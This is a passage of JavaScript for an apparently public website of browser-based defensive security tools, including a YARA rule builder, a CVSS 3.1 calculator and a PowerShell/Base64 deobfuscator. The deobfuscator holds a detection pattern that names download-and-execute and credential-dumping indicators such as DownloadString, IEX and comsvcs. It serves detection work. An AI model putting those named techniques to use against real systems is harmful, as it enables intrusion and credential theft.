        if (q === "all" || !q) return true;
        return e.id.toLowerCase().includes(q) || e.title.toLowerCase().includes(q) || e.mitre.toLowerCase().includes(q) || e.fields.toLowerCase().includes(q);
      });
      return `
        <table class="psv-out-table">
          <thead><tr><th>Event ID</th><th>Source</th><th>Description & XML Fields</th><th>MITRE ATT&CK</th><th>Elastic KQL Hunt & Tuning</th></tr></thead>
          <tbody>
            ${filtered.length ? filtered.map(e => `<tr><td style="color:#38bdf8;font-weight:800;">ID ${esc(e.id)}</td><td>${esc(e.source)}</td><td><strong>${esc(e.title)}</strong><br><span style="color:#94a3b8;font-size:0.74rem;">Fields: ${esc(e.fields)}</span></td><td style="color:#fbbf24;font-weight:700;">${esc(e.mitre)}</td><td><code>${esc(e.kql)}</code><br><span style="color:#94a3b8;font-size:0.73rem;">Tuning: ${esc(e.fp)}</span></td></tr>`).join("") : '<tr><td colspan="5">No matching event records. Try an event ID, keyword, or MITRE technique ID.</td></tr>'}
          </tbody>
        </table>
      `;
    }

    if (tool.id === "regex") {
      const parts = input.split(/LOG::/i);
      const patternStr = parts.length > 1 ? parts[0].replace(/^PATTERN::/i, "").trim() : "(?<ip>\\d+\\.\\d+\\.\\d+\\.\\d+)";
      const logBody = parts.length > 1 ? parts[1].trim() : input;
      try {
        const rx = new RegExp(patternStr, "gm");
        const matches = Array.from(logBody.matchAll(rx));
        if (!matches.length) return `<div style="color:#fbbf24;">0 matches found for pattern: <code>${esc(patternStr)}</code></div>`;
        const groupKeys = matches[0].groups ? Object.keys(matches[0].groups) : [];
        if (groupKeys.length) {
          return `
            <table class="psv-out-table">
              <thead><tr><th>#</th>${groupKeys.map(k => `<th>${esc(k)}</th>`).join("")}</tr></thead>
              <tbody>
                ${matches.map((m, idx) => `<tr><td>${idx + 1}</td>${groupKeys.map(k => `<td style="color:#38bdf8;">${esc(m.groups[k] || "")}</td>`).join("")}</tr>`).join("")}
              </tbody>
            </table>
          `;
        }
        return `
          <table class="psv-out-table">
            <thead><tr><th>Match #</th><th>Full Match</th><th>Capture Groups</th></tr></thead>
            <tbody>${matches.map((m, idx) => `<tr><td>${idx + 1}</td><td style="color:#38bdf8;">${esc(m[0])}</td><td>${esc(m.slice(1).join(" | "))}</td></tr>`).join("")}</tbody>
          </table>
        `;
      } catch (err) {
        return `<div style="color:#f87171;">Regex Syntax Error: ${esc(err.message)}</div>`;
      }
    }

    if (tool.id === "yara") {
      const name = ((input.match(/RULE_NAME::(\S+)/i) || [])[1] || "SOC_Custom_Rule").replace(/[^a-zA-Z0-9_]/g, "_");
      const author = ((input.match(/META_AUTHOR::(.+)/i) || [])[1] || "SOC Analyst").trim();
      const sev = ((input.match(/META_SEVERITY::(.+)/i) || [])[1] || "High").trim();
      const stringsRaw = ((input.match(/STRINGS::([\s\S]*?)(?=CONDITION::|$)/i) || [])[1] || '$s1 = "suspicious" ascii').trim();
      const condRaw = ((input.match(/CONDITION::([\s\S]*)$/i) || [])[1] || "uint16(0) == 0x5A4D and any of them").trim();

      const definedVars = Array.from(stringsRaw.matchAll(/(\$[A-Za-z0-9_]+)\s*=/g)).map(m => m[1]);
      const unreferenced = definedVars.filter(v => !condRaw.includes(v) && !condRaw.includes("them") && !condRaw.includes(v.slice(0, 2) + "*"));
      const compiled = `rule ${name} {\n  meta:\n    author = "${author}"\n    severity = "${sev}"\n    date = "${new Date().toISOString().slice(0, 10)}"\n  strings:\n    ${stringsRaw.split("\n").join("\n    ")}\n  condition:\n    ${condRaw}\n}`;

      return `
        <div role="note" style="margin-bottom:0.65rem;font-size:0.8rem;font-weight:700;color:${unreferenced.length ? "#fbbf24" : "#94a3b8"};">
          ${unreferenced.length ? `Reference check warning: unreferenced string variable(s): ${esc(unreferenced.join(", "))}` : `Textual reference check: no unreferenced identifiers detected among ${definedVars.length} declared strings`}
        </div>
        <p class="psv-tool-note">This is not a YARA parser or compiler. A clean reference check does not establish valid YARA syntax, modifiers, or condition semantics. Validate with the YARA compiler or approved engine.</p>
        <pre style="margin:0;color:#38bdf8;font-family:'Roboto Mono',SFMono-Regular,Consolas,monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(compiled)}</pre>
      `;    }

    if (tool.id === "deobfuscator") {
      let decoded = input;
      let method = "URL / Plaintext Unescape";
      const b64 = input.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i) || input.match(/([A-Za-z0-9+/=]{20,})/);
      if (b64) {
        try {
          const raw = atob(b64[1]);
          method = raw.includes("\x00") ? "UTF-16LE PowerShell Base64" : "Standard Base64";
          decoded = raw.replace(/\x00/g, "");
        } catch (e) {}
      } else {
        try { decoded = decodeURIComponent(input); } catch (e) {}
      }
      const alerts = Array.from(new Set(decoded.match(/IEX|Invoke-Expression|DownloadString|WebClient|FromBase64String|VirtualAlloc|rundll32|comsvcs|https?:\/\/[^\s'"]+/gi) || []));
      return `
        <table class="psv-out-table">
          <thead><tr><th>Analysis Stage</th><th>Result</th></tr></thead>
          <tbody>
            <tr><td>Detected Encoding</td><td style="color:#fbbf24;font-weight:700;">${esc(method)}</td></tr>
            <tr><td>De-obfuscated Plaintext</td><td style="color:#38bdf8;font-weight:600;">${esc(decoded)}</td></tr>
            <tr><td>Extracted Indicators / APIs</td><td style="color:#f87171;font-weight:700;">${esc(alerts.map(defang).join(" , ") || "None flagged")}</td></tr>
          </tbody>
        </table>
      `;
    }

    if (tool.id === "json") {
      try {
        const obj = JSON.parse(input);
        const flat = {};
        (function flatten(curr, prop) {
          if (Object(curr) !== curr) {
            flat[prop] = curr;
          } else if (Array.isArray(curr)) {
            flat[prop] = JSON.stringify(curr);
          } else {
            for (const p in curr) flatten(curr[p], prop ? prop + "." + p : p);
          }
        })(obj, "");

        return `
          <table class="psv-out-table" style="margin-bottom:1rem;">
            <thead><tr><th>Flattened ECS / SIEM Field Path</th><th>Extracted Value</th></tr></thead>
            <tbody>${Object.keys(flat).map(k => `<tr><td style="color:#38bdf8;font-weight:600;">${esc(k)}</td><td>${esc(flat[k])}</td></tr>`).join("")}</tbody>
          </table>
          <pre style="margin:0;color:#cbd5e1;font-family:'Roboto Mono',SFMono-Regular,Consolas,monospace;font-size:0.78rem;">${esc(JSON.stringify(obj, null, 2))}</pre>
        `;
      } catch (err) {
        return `<div style="color:#f87171;">JSON Syntax Error: ${esc(err.message)}</div>`;
      }
    }

    if (tool.id === "timestamp") {
      let date, precisionNote="", sourceKind="Date string";
      try {
        if(/^\d{10}$/.test(input)){date=new Date(Number(input)*1000);sourceKind="Unix epoch seconds";}
        else if(/^\d{13}$/.test(input)){date=new Date(Number(input));sourceKind="Unix epoch milliseconds";}
        else if(/^\d{16}$/.test(input)||/^\d{19}$/.test(input)){
          const n=BigInt(input), ms=input.length===16?n/1000n:n/1000000n, rem=input.length===16?(n%1000n)*1000n:n%1000000n;
          if(ms>8640000000000000n||ms< -8640000000000000n)throw new Error("Outside JavaScript Date range");
          date=new Date(Number(ms));precisionNote="Sub-millisecond remainder: "+rem.toString().padStart(6,"0")+" ns.";sourceKind=input.length===16?"Unix epoch microseconds":"Unix epoch nanoseconds";
        } else if(/^\d{18}$/.test(input)){
          const n=BigInt(input), ms=n/10000n-11644473600000n;
          if(ms>8640000000000000n||ms< -8640000000000000n)throw new Error("FILETIME outside JavaScript Date range");
          date=new Date(Number(ms));precisionNote="FILETIME remainder: "+(n%10000n).toString()+" × 100 ns ticks.";sourceKind="Windows FILETIME";
        } else date=new Date(input);
      } catch(e){return '<div role="alert">Invalid timestamp: '+esc(e.message||input)+'</div>';}
      if(!date||isNaN(date.getTime()))return '<div role="alert">Unsupported timestamp. Supported integer forms: 10, 13, 16, 18, or 19 digits; otherwise use a browser-parseable date string.</div>';
      const ms=date.getTime(), ft=(BigInt(ms)+11644473600000n)*10000n;
      return '<table class="psv-out-table"><thead><tr><th>Representation</th><th>Value</th></tr></thead><tbody>'+
        '<tr><td>Detected Input Type</td><td>'+esc(sourceKind)+'</td></tr><tr><td>ISO-8601 UTC</td><td>'+esc(date.toISOString())+'</td></tr><tr><td>UTC String</td><td>'+esc(date.toUTCString())+'</td></tr><tr><td>Analyst Local Time</td><td>'+esc(date.toString())+'</td></tr><tr><td>Unix Seconds</td><td>'+Math.floor(ms/1000)+'</td></tr><tr><td>Unix Milliseconds</td><td>'+ms+'</td></tr><tr><td>Windows FILETIME</td><td>'+ft.toString()+'</td></tr>'+
        (precisionNote?'<tr><td>Precision detail</td><td>'+esc(precisionNote)+'</td></tr>':"")+
        '</tbody></table><p class="psv-tool-note">JavaScript Date calendar display has millisecond precision. Sub-millisecond input precision is shown separately and is not represented in the displayed date/time.</p>';
    }

    if (tool.id === "severity") {
      const signals=[{label:"Critical asset / domain controller",pattern:/tier1_dc|domain_controller|critical/i,points:30},{label:"Server / production asset",pattern:/server|production/i,points:15},{label:"Regulated or sensitive data",pattern:/regulated_pii|pci|hipaa|secret/i,points:20},{label:"Multi-host or domain-wide scope",pattern:/multi_host_lateral|domain_wide/i,points:15},{label:"Active C2 / exfiltration / ransomware",pattern:/active_c2_exfil|ransomware/i,points:15},{label:"Privileged identity",pattern:/domain_admin|root|system/i,points:10}];
      let score=20;const matched=signals.filter(x=>x.pattern.test(input));matched.forEach(x=>score+=x.points);score=Math.min(100,score);
      const p=score>=85?"P1 — Critical (example target: 15 min)":score>=65?"P2 — High (example target: 1 hour)":score>=40?"P3 — Medium (example target: 4 hours)":"P4 — Low (example target: 24 hours)";
      return '<div role="note" class="psv-tool-note"><strong>Heuristic only:</strong> Starts at 20 and adds fixed weights when selected keywords appear anywhere in raw text. It does not parse structured fields, validate facts, infer confidence, or apply your organisation policy. Response targets are illustrative, not commitments.</div>'+
      '<table class="psv-out-table"><thead><tr><th>Metric</th><th>Result</th></tr></thead><tbody><tr><td>Illustrative Priority Band</td><td>'+esc(p)+'</td></tr><tr><td>Heuristic Score</td><td>'+score+' / 100</td></tr><tr><td>Baseline</td><td>20 points</td></tr><tr><td>Matched Signals</td><td>'+(matched.length?matched.map(x=>esc(x.label+" (+"+x.points+")")).join("<br>"):"No configured signals matched")+'</td></tr><tr><td>Next Step</td><td>Validate business impact, evidence confidence, scope, threat activity, and containment status with the incident owner. Do not isolate systems or revoke sessions solely from this score; follow approved response procedures.</td></tr></tbody></table>';
    }

    if (tool.id === "report") {
      const getVal = k => ((input.match(new RegExp(k + "::([\\s\\S]*?)(?=\\n[A-Z_]+::|$)", "i")) || [])[1] || "").trim();
      const md = `# SOC INCIDENT REPORT — ${getVal("INCIDENT_ID") || "INC-2026"}\n**Title:** ${getVal("TITLE")}\n**Severity:** ${getVal("SEVERITY")}\n**Detection Source:** ${getVal("DETECTION_SOURCE")}\n\n## 1. Affected Assets\n${getVal("AFFECTED_ASSETS")}\n\n## 2. MITRE ATT&CK Tactics & Techniques\n${getVal("MITRE_TACTICS")}\n\n## 3. Investigation Timeline (UTC)\n${getVal("TIMELINE")}\n\n## 4. Defanged Indicators of Compromise\n${defang(getVal("IOCS"))}\n\n## 5. Containment & Eradication Actions\n${getVal("CONTAINMENT")}`;
      return `<pre style="margin:0;color:#38bdf8;font-family:'Roboto Mono',SFMono-Regular,Consolas,monospace;font-size:0.8rem;white-space:pre-wrap;">${esc(md)}</pre>`;
    }

    if (tool.id === "cvss") {
      const parts = input.split("/");
      if (parts[0] !== "CVSS:3.1") return '<div role="alert" class="psv-ti-error">A CVSS:3.1 vector beginning with CVSS:3.1/ is required.</div>';
      const m = {};
      const allowed = {
        AV:["N","A","L","P"], AC:["L","H"], PR:["N","L","H"], UI:["N","R"], S:["U","C"],
        C:["H","L","N"], I:["H","L","N"], A:["H","L","N"],
        E:["X","H","F","P","U"], RL:["X","U","W","T","O"], RC:["X","C","R","U"],
        CR:["X","H","M","L"], IR:["X","H","M","L"], AR:["X","H","M","L"],
        MAV:["X","N","A","L","P"], MAC:["X","L","H"], MPR:["X","N","L","H"], MUI:["X","N","R"],
        MS:["X","U","C"], MC:["X","N","L","H"], MI:["X","N","L","H"], MA:["X","N","L","H"]
      };
      for (let index=1; index<parts.length; index++) {
        const kv=parts[index].split(":");
        if(kv.length!==2 || !kv[0] || !kv[1]) return '<div role="alert" class="psv-ti-error">Malformed vector component: '+esc(parts[index])+'</div>';
        const key=kv[0].toUpperCase(), value=kv[1].toUpperCase();
        if(!Object.prototype.hasOwnProperty.call(allowed,key)) return '<div role="alert" class="psv-ti-error">Unsupported CVSS v3.1 metric: '+esc(key)+'</div>';
        if(Object.prototype.hasOwnProperty.call(m,key)) return '<div role="alert" class="psv-ti-error">Duplicate CVSS metric: '+esc(key)+'</div>';
        if(!allowed[key].includes(value)) return '<div role="alert" class="psv-ti-error">Invalid value '+esc(value)+' for metric '+esc(key)+'.</div>';
        m[key]=value;
      }
      const required=["AV","AC","PR","UI","S","C","I","A"], missing=required.filter(key=>!m[key]);
      if(missing.length) return '<div role="alert" class="psv-ti-error">Missing required Base metrics: '+esc(missing.join(", "))+'.</div>';

      const avMap={N:.85,A:.62,L:.55,P:.2}, acMap={L:.77,H:.44}, uiMap={N:.85,R:.62}, impactMap={H:.56,L:.22,N:0};
      const prMap={N:.85,L: m.S === "C" ? 0.68 : 0.62, H: m.S === "C" ? 0.5 : 0.27};
      const roundup=v=>Math.ceil((v-1e-10)*10)/10, cap=v=>Math.min(v,10);
      const c=impactMap[m.C], i=impactMap[m.I], a=impactMap[m.A];
      const iss=1-(1-c)*(1-i)*(1-a), changed=m.S==="C";
      const impact=changed?7.52*(iss-.029)-3.25*Math.pow(iss-.02,15):6.42*iss;
      const exploit=8.22*avMap[m.AV]*acMap[m.AC]*prMap[m.PR]*uiMap[m.UI];
      const base=impact<=0?0:roundup(cap((changed?1.08:1)*(impact+exploit)));

      const weights={E:{X:1,H:1,F:.97,P:.94,U:.91},RL:{X:1,U:1,W:.97,T:.96,O:.95},RC:{X:1,C:1,R:.96,U:.92}};
      const temporalFactor=["E","RL","RC"].reduce((v,key)=>v*weights[key][m[key]||"X"],1);
      const temporal=roundup(base*temporalFactor);
      const req={X:1,H:1.5,M:1,L:.5};
      const miss=Math.min(1-(1-req[m.CR||"X"]*impactMap[m.MC&&m.MC!=="X"?m.MC:m.C])*(1-req[m.IR||"X"]*impactMap[m.MI&&m.MI!=="X"?m.MI:m.I])*(1-req[m.AR||"X"]*impactMap[m.MA&&m.MA!=="X"?m.MA:m.A]),.915);
      const modifiedScope=(m.MS&&m.MS!=="X"?m.MS:m.S)==="C";
      const modifiedImpact=modifiedScope?7.52*(miss-.029)-3.25*Math.pow(miss*.9731-.02,13):6.42*miss;
      const mv=(key,baseKey)=>m[key]&&m[key]!=="X"?m[key]:m[baseKey];
      const modifiedPR={N:.85,L: modifiedScope ? 0.68 : 0.62, H: modifiedScope ? 0.5 : 0.27};
      const modifiedExploit=8.22*avMap[mv("MAV","AV")]*acMap[mv("MAC","AC")]*modifiedPR[mv("MPR","PR")]*uiMap[mv("MUI","UI")];
      const environmentalBase=modifiedImpact<=0?0:roundup(cap((modifiedScope?1.08:1)*(modifiedImpact+modifiedExploit)));
      const environmental=modifiedImpact<=0?0:roundup(environmentalBase*temporalFactor);
      const rating=v=>v>=9?"CRITICAL":v>=7?"HIGH":v>=4?"MEDIUM":v>0?"LOW":"NONE";
      const envKeys=["CR","IR","AR","MAV","MAC","MPR","MUI","MS","MC","MI","MA"];
      const envText=envKeys.map(k=>k+":"+(m[k]||"X")).join(" · ");
      return `
        <table class="psv-out-table"><thead><tr><th>CVSS v3.1 group</th><th>Score</th><th>Severity</th><th>Details</th></tr></thead><tbody>
          <tr><td><strong>Base</strong></td><td>${base.toFixed(1)} / 10.0</td><td>${rating(base)}</td><td>Impact: ${impact.toFixed(4)} · Exploitability: ${exploit.toFixed(4)}</td></tr>
          <tr><td><strong>Temporal</strong></td><td>${temporal.toFixed(1)} / 10.0</td><td>${rating(temporal)}</td><td>E:${m.E||"X"} · RL:${m.RL||"X"} · RC:${m.RC||"X"}</td></tr>
          <tr><td><strong>Environmental</strong></td><td>${environmental.toFixed(1)} / 10.0</td><td>${rating(environmental)}</td><td>Modified impact: ${modifiedImpact.toFixed(4)} · Modified exploitability: ${modifiedExploit.toFixed(4)}</td></tr>
        </tbody></table><p><strong>Vector:</strong> <code>${esc(input)}</code></p><p><strong>Environmental metrics:</strong> ${esc(envText)}</p>
        <p>CVSS v3.1 is a vulnerability severity framework, not a complete organizational risk assessment. Verify the vector assumptions before using the score.</p>`;
    }

    return "";
  }

  function renderCatalogView(root) {
    const filtered = TOOLS.filter(t => {
      const catOk = activeCat === "all" || t.cat === activeCat;
      const qOk = !searchQuery || t.title.toLowerCase().includes(searchQuery) || t.desc.toLowerCase().includes(searchQuery);
      return catOk && qOk;
    });

    root.innerHTML = `
      <div id="psv-app">
        <div class="psv-hero-split">
          <div>
            <div class="psv-eyebrow">// INTERACTIVE SECURITY TOOLS</div>
            <h1 class="psv-hero-h1">Free <span>Security Tools</span><br>Built for Defenders.</h1>
            <p class="psv-hero-desc">13 browser-based SOC, DFIR, and detection-support tools. Most processing stays in your browser; the Threat Intel Hub contacts public providers only after you select Enrich Indicator.</p>
            <div class="psv-stats-bar">
              <div class="psv-stat-cell"><div class="psv-stat-val">13</div><div class="psv-stat-lbl">Security Tools</div></div>
              <div class="psv-stat-cell"><div class="psv-stat-val">Local</div><div class="psv-stat-lbl">Most Processing</div></div>
              <div class="psv-stat-cell"><div class="psv-stat-val">Opt-in</div><div class="psv-stat-lbl">External Lookups</div></div>
            </div>
          </div>

          <div class="psv-preview-box">
            <div class="psv-preview-top">
              <span>PSV // QUICK-LAUNCH MATRIX</span>
              <span>CLICK TO OPEN</span>
            </div>
            <div class="psv-preview-mini-grid">
              ${TOOLS.slice(0, 9).map(t => `
                <button type="button" class="psv-mini-tile" data-psv-action="open-tool" data-tool="${esc(t.id)}">
                  <span>[${esc(t.badge)}]</span>${esc(t.shortTitle)}
                </button>
              `).join("")}
            </div>
          </div>
        </div>

        <div class="psv-catalog-window">
          <div class="psv-window-bar">
            <div class="psv-window-dots">
              <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
              <span style="margin-left:0.5rem;">PSV // SECURITY-TOOLS-CATALOG</span>
            </div>
            <span>13 TOOLS · BROWSER-BASED · EXTERNAL LOOKUPS ARE OPT-IN</span>
          </div>

          <div class="psv-catalog-body">
            <input type="search" id="psv-cat-search" class="psv-search-bar" placeholder="Search 13 tools (e.g. ioc, sigma, sysmon, yara, phishing, cvss, timestamp)..." value="${esc(searchQuery)}" />

            <div class="psv-cat-pills">
              ${CATEGORIES.map(c => {
                const count = c.id === "all" ? TOOLS.length : TOOLS.filter(t => t.cat === c.id).length;
                return `<button type="button" class="psv-pill ${activeCat === c.id ? "active" : ""}" data-psv-action="set-cat" data-cat="${esc(c.id)}">${esc(c.label)} (${count})</button>`;
              }).join("")}
            </div>

            <div class="psv-cards-grid">
              ${filtered.map(t => `
                <div class="psv-tool-card" role="button" tabindex="0" data-psv-action="open-tool" data-tool="${esc(t.id)}">
                  <div>
                    <div class="psv-card-head">
                      <span class="psv-card-badge">${esc(t.badge)}</span>
                      <span class="psv-card-cat-lbl">${esc(t.cat.toUpperCase())}</span>
                    </div>
                    <h3 class="psv-card-title">${esc(t.title)}</h3>
                    <p class="psv-card-desc">${esc(t.desc)}</p>
                  </div>
                  <div class="psv-card-foot">
                    <span class="psv-client-tag">● Browser-based</span>
                    <span class="psv-open-link">Open Tool →</span>
                  </div>
                </div>
              `).join("")}
            </div>
          </div>
        </div>
      </div>
    `;
  }

  function renderSingleToolView(root) {
    const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
    const currentInput = userInputs[tool.id] !== undefined ? userInputs[tool.id] : tool.sample;
    const relatedTools = (tool.related || []).map(rid => TOOLS.find(t => t.id === rid)).filter(Boolean);

    root.innerHTML = `
      <div id="psv-app">
        <div class="psv-tool-page">
          <div class="psv-back-bar">
            <button type="button" class="psv-back-btn" data-psv-action="back-catalog">← Back to All Security Tools (13)</button>
            <div style="display:flex;gap:0.4rem;flex-wrap:wrap;">
              ${TOOLS.map(t => `<button type="button" class="psv-opt-pill ${t.id === tool.id ? "active" : ""}" style="padding:0.28rem 0.6rem;font-size:0.71rem;" data-psv-action="open-tool" data-tool="${esc(t.id)}">${esc(t.badge)}</button>`).join("")}
            </div>
          </div>

          <div class="psv-tool-hero">
            <div class="psv-tool-hero-icon">${esc(tool.badge)}</div>
            <h1>${esc(tool.title)}</h1>
            <p>${esc(tool.desc)}</p>
            <div class="psv-hero-badges">
              <span class="psv-pill-badge">Browser-based processing</span>
              <span class="psv-pill-badge">${tool.id === "ti" ? "External requests on explicit action" : "No external lookup performed by this tool"}</span>
            </div>
          </div>

          <div class="psv-terminal-box">
            <div class="psv-window-bar">
              <div class="psv-window-dots">
                <span class="psv-dot"></span><span class="psv-dot"></span><span class="psv-dot"></span>
                <span style="margin-left:0.5rem;">PSV // ${esc(tool.id.toUpperCase())}-WORKBENCH</span>
              </div>
              <span>ACTIVE WORKSPACE</span>
            </div>

            <div class="psv-term-body">
              <div class="psv-privacy-strip">
                <strong>Data handling:</strong> ${tool.id === "ti" ? "The indicator is sent to the public services listed in the disclosure only when you select Enrich Indicator. No lookup is made while typing." : tool.id === "sigma" ? "The input is processed in this browser for display only; no Sigma validation or conversion is performed." : "This tool processes input in your browser. Do not submit confidential or employer-sensitive data to a public website."}
              </div>

              <div class="psv-field-label">
                <span>INPUT TELEMETRY / PAYLOAD (EDIT BELOW OR CLICK A PRESET PILL)</span>
                <span>REAL-TIME ENGINE</span>
              </div>
              <textarea id="psv-tool-editor" class="psv-editor" spellcheck="false">${esc(currentInput)}</textarea>

              <div class="psv-action-bar">
                <div class="psv-opt-group">
                  ${(tool.options || []).map((opt, idx) => `
                    <button type="button" class="psv-opt-pill ${selectedOptionIdx === idx ? "active" : ""}" data-psv-action="set-opt" data-opt="${idx}">${esc(opt)}</button>
                  `).join("")}
                </div>

                <div class="psv-btn-group">
                  <button type="button" class="psv-btn-run" data-psv-action="run-tool">⚡ ${esc(tool.actionLabel)}</button>
                  <button type="button" class="psv-btn-util" data-psv-action="load-sample">Reset Sample</button>
                  <button type="button" class="psv-btn-util" data-psv-action="copy-output">${copyFeedback ? "✓ Copied!" : "Copy Output"}</button>
                  <button type="button" class="psv-btn-util" data-psv-action="clear-tool">Clear</button>
                </div>
              </div>

              <div class="psv-field-label">
                <span>COMPUTED ANALYSIS OUTPUT</span>
              </div>
              <div id="psv-tool-result-box" class="psv-output-container">
                ${computeDynamicOutput(tool, currentInput)}
              </div>
            </div>
          </div>

          <div class="psv-doc-section">
            <h3>What this tool does</h3>
            <p>${esc(tool.whatItDoes)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>Why it matters</h3>
            <p>${esc(tool.whyItMatters)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>How it works</h3>
            <p>${esc(tool.howItWorks)}</p>
          </div>

          <div class="psv-doc-section">
            <h3>Best practices</h3>
            <ul>
              ${(tool.bestPractices || []).map(bp => `<li>${esc(bp)}</li>`).join("")}
            </ul>
          </div>

          <div class="psv-doc-section">
            <h3>Frequently Asked Questions</h3>
            ${(tool.faqs || []).map(f => `
              <details class="psv-faq-item">
                <summary>${esc(f.q)}</summary>
                <p>${esc(f.a)}</p>
              </details>
            `).join("")}
          </div>

          <div class="psv-doc-section">
            <h3>Related Security Tools</h3>
            <div class="psv-related-grid">
              ${relatedTools.map(rt => `
                <div class="psv-tool-card" role="button" tabindex="0" data-psv-action="open-tool" data-tool="${esc(rt.id)}">
                  <div>
                    <div class="psv-card-head">
                      <span class="psv-card-badge">${esc(rt.badge)}</span>
                    </div>
                    <h4 class="psv-card-title" style="font-size:0.92rem;">${esc(rt.title)}</h4>
                    <p class="psv-card-desc" style="font-size:0.75rem;margin-bottom:0.5rem;">${esc(rt.desc)}</p>
                  </div>
                  <span class="psv-open-link" style="font-size:0.74rem;">Open Tool →</span>
                </div>
              `).join("")}
            </div>
          </div>
        </div>
      </div>
    `;
  }

  function render() {
    injectStyles();
    const root = getRoot();
    if (!root) return;
    if (currentView === "tool") {
      renderSingleToolView(root);
    } else {
      renderCatalogView(root);
    }
  }

  /* === CAPTURE-PHASE GLOBAL EVENT LISTENER (Cannot be blocked by MkDocs Material) === */
  if (!window.__psvCaptureBound) {
    window.__psvCaptureBound = true;

    window.addEventListener("click", function (e) {
      const target = e.target && e.target.closest ? e.target.closest("[data-psv-action]") : null;
      if (!target) return;

      e.preventDefault();
      e.stopPropagation();

      const action = target.getAttribute("data-psv-action");

      if (action === "open-tool") {
        const tid = target.getAttribute("data-tool");
        if (tid) {
          tiLookupSequence++;
          activeToolId = tid;
          selectedOptionIdx = 0;
          currentView = "tool";
          try { history.pushState({ tool: tid }, "", "#tool/" + tid); } catch (err) {}
          render();
          window.scrollTo({ top: 0, behavior: "smooth" });
        }
      } else if (action === "back-catalog") {
        currentView = "catalog";
        try { history.pushState({}, "", window.location.pathname); } catch (err) {}
        render();
        window.scrollTo({ top: 0, behavior: "smooth" });
      } else if (action === "set-cat") {
        activeCat = target.getAttribute("data-cat") || "all";
        render();
      } else if (action === "set-opt") {
        const idx = parseInt(target.getAttribute("data-opt") || "0", 10);
        selectedOptionIdx = idx;
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        applyPresetOption(tool, idx);
        render();
      } else if (action === "run-tool") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        const ed = document.getElementById("psv-tool-editor");
        const out = document.getElementById("psv-tool-result-box");
        if (ed && out) {
          if (!ed.value.trim()) ed.value = tool.sample;
          userInputs[tool.id] = ed.value;
          if (tool.id === "ti") runThreatIntelLookup(ed.value, out);
          else out.innerHTML = computeDynamicOutput(tool, ed.value);
        }
      } else if (action === "load-sample") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        selectedOptionIdx = 0;
        userInputs[tool.id] = tool.sample;
        render();
      } else if (action === "clear-tool") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        userInputs[tool.id] = "";
        const ed = document.getElementById("psv-tool-editor");
        const out = document.getElementById("psv-tool-result-box");
        if (tool.id === "ti") tiLookupSequence++;
        if (ed) ed.value = "";
        if (out) out.innerHTML = `<div style="color:#94a3b8;padding:0.5rem;">Workspace cleared. Click <strong>Reset Sample</strong> or paste your own telemetry above.</div>`;
      } else if (action === "copy-output") {
        const out = document.getElementById("psv-tool-result-box");
        if (!out) return;
        if (!navigator.clipboard || !navigator.clipboard.writeText) {
          target.textContent = "Clipboard unavailable — select output manually";
          return;
        }
        navigator.clipboard.writeText(out.innerText).then(() => {
          target.textContent = "✓ Copied!";
          setTimeout(() => { if (target.isConnected) target.textContent = "Copy Output"; }, 1500);
        }).catch(() => {
          target.textContent = "Copy failed — select output manually";
        });
      } else if (action === "pivot-ti") {
        const ind = target.getAttribute("data-indicator") || "1.1.1.1";
        activeToolId = "ti";
        userInputs.ti = ind;
        selectedOptionIdx = 0;
        currentView = "tool";
        render();
        window.scrollTo({ top: 0, behavior: "smooth" });
      }
    }, true);

    window.addEventListener("keydown", function (e) {
      const card = e.target && e.target.closest ? e.target.closest('.psv-tool-card[role="button"][data-psv-action="open-tool"]') : null;
      if (!card || (e.key !== "Enter" && e.key !== " ")) return;
      e.preventDefault();
      card.click();
    }, true);

    window.addEventListener("input", function (e) {
      if (e.target && e.target.id === "psv-cat-search") {
        searchQuery = e.target.value.toLowerCase();
        const pos = e.target.selectionStart || searchQuery.length;
        render();
        const restored = document.getElementById("psv-cat-search");
        if (restored) {
          restored.focus();
          restored.setSelectionRange(pos, pos);
        }
      } else if (e.target && e.target.id === "psv-tool-editor") {
        const tool = TOOLS.find(t => t.id === activeToolId) || TOOLS[0];
        userInputs[tool.id] = e.target.value;
        if (tool.id === "ti") tiLookupSequence++;
        const out = document.getElementById("psv-tool-result-box");
        if (out) out.innerHTML = computeDynamicOutput(tool, e.target.value);
      }
    }, true);

    window.addEventListener("popstate", function () {
      const h = window.location.hash || "";
      if (h.startsWith("#tool/")) {
        const id = h.replace("#tool/", "").trim();
        if (TOOLS.some(t => t.id === id)) {
          activeToolId = id;
          currentView = "tool";
          render();
          return;
        }
      }
      currentView = "catalog";
      render();
    });
  }

  function init() {
    if (!/\/tools(?:\/|$)/.test(window.location.pathname)) {
      const injectedStyles = document.getElementById("psv-hiderox-royal-css");
      if (injectedStyles) injectedStyles.remove();
      return;
    }
    const h = window.location.hash || "";
    if (h.startsWith("#tool/")) {
      const id = h.replace("#tool/", "").trim();
      if (TOOLS.some(t => t.id === id)) {
        activeToolId = id;
        currentView = "tool";
      }
    }
    render();
  }

  if (typeof document$ !== "undefined") {
    document$.subscribe(() => init());
  } else if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();